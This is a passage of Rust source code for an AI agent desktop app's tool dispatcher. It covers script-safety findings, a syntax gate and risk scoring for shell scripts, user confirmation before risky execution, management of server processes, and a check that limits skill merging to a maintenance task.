                    reason.push_str(&format!("\n- {} ({})\n", scan.file_name, scan.hash));
                    for hit in &scan.hits {
                        reason.push_str(&format!(
                            "  - [{}] {}: {}\n",
                            hit.rule_id, hit.severity, hit.matched
                        ));
                    }
                }
            }

            // A script hit is always the `dangerous` kind: the body scan only
            // fires on destructive or sensitive patterns, so a user who
            // auto-accepts a weaker kind must still see this one.
            let confirm_kind = if unapproved.is_empty() {
                risk_level.confirm_kind()
            } else {
                "dangerous"
            };
            let confirm = request_tool_confirmation(
                app,
                reason,
                "direct".to_string(),
                command.clone(),
                confirm_kind,
                "none",
                cancel,
            )
            .await;

            if !confirm.confirmed {
                let mut out = String::from("⛔ Execution rejected by user");
                if needs_risk_confirmation {
                    out.push_str(&format!(
                        "\n\nRisk level: {}\nRisk score: {}\nDisposition: {}\n\nStructured report:\n```json\n{}\n```",
                        report.risk_level,
                        report.risk_score,
                        report.disposition,
                        serde_json::to_string_pretty(&report).unwrap_or_default()
                    ));
                }
                if !unapproved.is_empty() {
                    out.push_str(&format!(
                        "\n\nUnapproved script safety findings: {}",
                        unapproved
                            .iter()
                            .map(|scan| scan.file_name.as_str())
                            .collect::<Vec<_>>()
                            .join(", ")
                    ));
                }
                return out;
            }

            // The user accepted exactly this content: remember it per file.
            for scan in &unapproved {
                scripts::approve(&workspace_dir, &scan.file_name, &scan.hash);
            }

            let _ = emit_tool_progress(
                app,
                mission_id,
                if needs_risk_confirmation {
                    format!(
                        "⚠️ *User confirmed execution: {} (score: {})*\n\n```\n{}\n```\n\n",
                        report.risk_level, report.risk_score, command
                    )
                } else {
                    format!(
                        "⚠️ *User approved script content: {}*\n\n```\n{}\n```\n\n",
                        unapproved
                            .iter()
                            .map(|scan| scan.file_name.as_str())
                            .collect::<Vec<_>>()
                            .join(", "),
                        command
                    )
                },
            );

            run_run_cmd(
                &workspace_dir,
                &scripts_dir,
                resolved.as_ref(),
                &parts,
                &command,
                command_cwd,
                timeout_secs,
                cancel.cloned(),
            )
            .await
        }
        "run_shell" => {
            // The interpreter is a build-time property of this desktop app
            // (Windows → pwsh, Linux/macOS → bash). A `type` supplied by an old
            // prompt or a reused tool call is ignored: the model writes the
            // script, the build decides what runs it.
            let shell_type = RUN_SHELL_TYPE.to_string();
            let run_type = args["run_type"]
                .as_str()
                .unwrap_or("direct")
                .trim()
                .to_ascii_lowercase();
            let action = args["action"]
                .as_str()
                .unwrap_or("start")
                .trim()
                .to_ascii_lowercase();
            let command_cwd = working_dir
                .map(Path::to_path_buf)
                .unwrap_or_else(|| workspace_dir.clone());

            if !matches!(run_type.as_str(), "direct" | "serve") {
                return format!(
                    "Error: unsupported run_type '{}'. Supported: direct, serve",
                    run_type
                );
            }

            // Serve management is about processes this app started, not about
            // running a script — no shell validation, risk assessment or
            // confirmation is needed to list/stop them.
            if run_type == "serve" {
                match action.as_str() {
                    "list" => {
                        return app.state::<crate::AppState>().serve_processes.list();
                    }
                    "stop" => {
                        let serve_id = args["serve_id"]
                            .as_str()
                            .or_else(|| args["code"].as_str())
                            .unwrap_or("")
                            .trim()
                            .to_string();
                        return app
                            .state::<crate::AppState>()
                            .serve_processes
                            .stop(&serve_id);
                    }
                    "start" => {}
                    other => {
                        return format!(
                            "Error: unsupported serve action '{}'. Supported: start, stop, list",
                            other
                        );
                    }
                }
            } else if action != "start" {
                return format!(
                    "Error: action '{}' is only valid with run_type 'serve'. Use run_type 'direct' to run a script.",
                    action
                );
            }

            let code = args["code"].as_str().unwrap_or("").to_string();

            if code.trim().is_empty() {
                return "Error: run_shell requires a non-empty 'code' argument.".to_string();
            }

            // ── Patent-compliant risk assessment ──────────────────────────────
            let request_id = format!(
                "req-{}",
                uuid::Uuid::new_v4()
                    .to_string()
                    .split('-')
                    .next()
                    .unwrap_or("unknown")
            );
            let report = generate_risk_report(&shell_type, &code, &request_id);

            // ── Syntax Gate: reject invalid scripts before execution ─────────
            if report.syntax_check.status == "failed" {
                let error_details: Vec<String> = report
                    .syntax_check
                    .syntax_errors
                    .iter()
                    .map(|e| {
                        format!(
                            "  - Line {}:{}: {} ({})",
                            e.line, e.column, e.message, e.error_type
                        )
                    })
                    .collect();

                // Emit syntax error event for frontend
                let _ = app.emit(
                    "syntax-error",
                    serde_json::json!({
                        "request_id": request_id,
                        "cmd_type": shell_type,
                        "code": code,
                        "syntax_errors": report.syntax_check.syntax_errors,
                        "report": report,
                    }),
                );

                return format!(
                    "⛔ Syntax gate blocked: the script is syntactically invalid and will not run\n\n\
                    Error details:\n{}\n\n\
                    Fix suggestions:\n{}\n\n\
                    Structured report:\n```json\n{}\n```",
                    error_details.join("\n"),
                    report.syntax_check.syntax_errors
                        .iter()
                        .map(|e| format!("  - {}", e.suggestion))
                        .collect::<Vec<_>>()
                        .join("\n"),
                    serde_json::to_string_pretty(&report).unwrap_or_default()
                );
            }

            let risk_level = score_to_risk_level(report.risk_score);
            let scoped_code =
                build_workspace_scoped_shell_code(&shell_type, &command_cwd, &code);

            // ── Emit risk assessment event for frontend display ───────────────
            let _ = app.emit(
                "risk-assessment",
                serde_json::json!({
                    "request_id": request_id,
                    "cmd_type": shell_type,
                    "code": code,
                    "risk_level": report.risk_level,
                    "risk_score": report.risk_score,
                    "disposition": report.disposition,
                    "recommendation": report.recommendation,
                    "blacklist_hits": report.blacklist_hits,
                    "penalty_items": report.penalty_items,
                    "requires_confirmation": !risk_level.is_auto_approvable(),
                    "report": report,
                }),
            );

            // ── L5/L6: run directly (no confirmation) ────────────────────────
            if risk_level.is_auto_approvable() {
                let _ = emit_tool_progress(
                    app,
                    mission_id,
                    format!(
                        "✅ *Risk assessment passed: {} (score: {}) - running directly*\n\n```{}\n{}\n```\n\n",
                        report.risk_level, report.risk_score, shell_type, code
                    ),
                );

                let timeout_secs = args["timeout_seconds"]
                    .as_i64()
                    .unwrap_or(30)
                    .clamp(1, 3600) as u64;

                if run_type == "serve" {
                    return serve::start(app, &shell_type, &code, scoped_code, command_cwd).await;
                }

                return process::run_command_timed(
                    shell_type,
                    scoped_code,
                    Some(command_cwd),
                    timeout_secs,
                    cancel.cloned(),
                    None,
                )
                .await;
            }

            // ── L0-L4: require frontend confirmation ─────────────────────────
            let confirm = request_tool_confirmation(
                app,
                format!(
                    "Risk assessment: {} (score: {})\nDisposition: {}\n\nMatched rules:\n{}\n\nPenalty items:\n{}",
                    report.risk_level,
                    report.risk_score,
                    report.disposition,
                    report.blacklist_hits.iter()
                        .map(|h| format!("  - [{}] {}: {}", h.rule_id, h.severity, h.matched))
                        .collect::<Vec<_>>()
                        .join("\n"),
                    report.penalty_items.iter()
                        .map(|p| format!("  - {}: +{}", p.name, p.points))
                        .collect::<Vec<_>>()
                        .join("\n")
                ),
                shell_type.clone(),
                code.clone(),
                risk_level.confirm_kind(),
                "none",
                cancel,
            )
            .await;

            if !confirm.confirmed {
                return format!(
                    "⛔ Execution rejected by user\n\n\
                    Risk level: {}\n\
                    Risk score: {}\n\
                    Disposition: {}\n\n\
                    Structured report:\n```json\n{}\n```",
                    report.risk_level,
                    report.risk_score,
                    report.disposition,
                    serde_json::to_string_pretty(&report).unwrap_or_default()
                );
            }

            // ── Execute after user confirmation ───────────────────────────────
            let _ = emit_tool_progress(
                app,
                mission_id,
                format!(
                    "⚠️ *User confirmed execution: {} (score: {})*\n\n```{}\n{}\n```\n\n",
                    report.risk_level, report.risk_score, shell_type, code
                ),
            );

            let timeout_secs = args["timeout_seconds"]
                .as_i64()
                .unwrap_or(30)
                .clamp(1, 3600) as u64;

            if run_type == "serve" {
                return serve::start(app, &shell_type, &code, scoped_code, command_cwd).await;
            }

            process::run_command_timed(
                shell_type,
                scoped_code,
                Some(command_cwd),
                timeout_secs,
                cancel.cloned(),
                None,
            )
            .await
        }
        "file_actions" => {
            file_actions::handle_file_actions(
                app,
                &args,
                &workspace_dir,
                protected_skill_root,
                mission_id,
                cancel,
            )
            .await
        }
        "skill_merge" => {
            // Maintenance-only: the tool is advertised solely by the evolution
            // maintenance loop, and the mission id makes a hand-crafted call
            // from the main agent or a sub-agent fail instead of merging
            // skills behind the user's back.
            if mission_id != Some(crate::evolution_maintenance::MISSION_ID) {
                "Error: skill_merge is only available to the evolution maintenance turn."
                    .to_string()
            } else {
                skill_admin::handle_skill_merge(app, &args, &workspace_dir, config, mission_id)
            }
        }
        _ => format!("Unknown tool: {}", name),
    };

    truncate_tool_output(tool_output)
}
